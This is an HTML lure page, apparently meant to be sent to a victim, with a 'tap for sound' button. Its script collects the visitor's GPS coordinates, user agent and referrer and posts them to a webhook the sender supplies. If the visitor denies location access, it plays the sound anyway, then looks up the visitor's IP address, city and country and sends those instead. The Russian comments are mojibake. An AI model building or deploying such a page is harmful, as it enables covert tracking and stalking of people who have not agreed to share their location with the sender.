<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <button id="playButton">üéµ TAP FOR SOUND & LOCATION üéµ</button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');
        const MY_WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-URL'; // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π webhook URL

        function sendLocation(locationData) {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ webhook
            fetch(MY_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    location: locationData,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    referrer: document.referrer
                })
            }).catch(error => console.log('Error sending data'));
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters'
                        };
                        
                        statusDiv.innerHTML = `üìç Location: ${locationData.latitude}, ${locationData.longitude}`;
                        sendLocation(locationData);
                        
                        // –í–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º –∑–≤—É–∫ –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è –ª–æ–∫–∞—Ü–∏–∏
                        playSound();
                    },
                    function(error) {
                        statusDiv.innerHTML = '‚ùå Location access denied';
                        // –í—Å–µ —Ä–∞–≤–Ω–æ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º –∑–≤—É–∫
                        playSound();
                        
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º IP-based location
                        fetch('https://ipapi.co/json/')
                            .then(response => response.json())
                            .then(ipData => {
                                sendLocation({
                                    ip: ipData.ip,
                                    city: ipData.city,
                                    country: ipData.country_name,
                                    approximate: true
                                });
                            });
                    }
                );
            } else {
                statusDiv.innerHTML = 'Geolocation not supported';
                playSound();
            }
        }

        function playSound() {
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = 'üîä SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            });
        }

        document.getElementById('playButton').addEventListener('click', function() {
            statusDiv.innerHTML = 'üïê Requesting location...';
            getLocation();
        });
    </script>
</body>
</html>
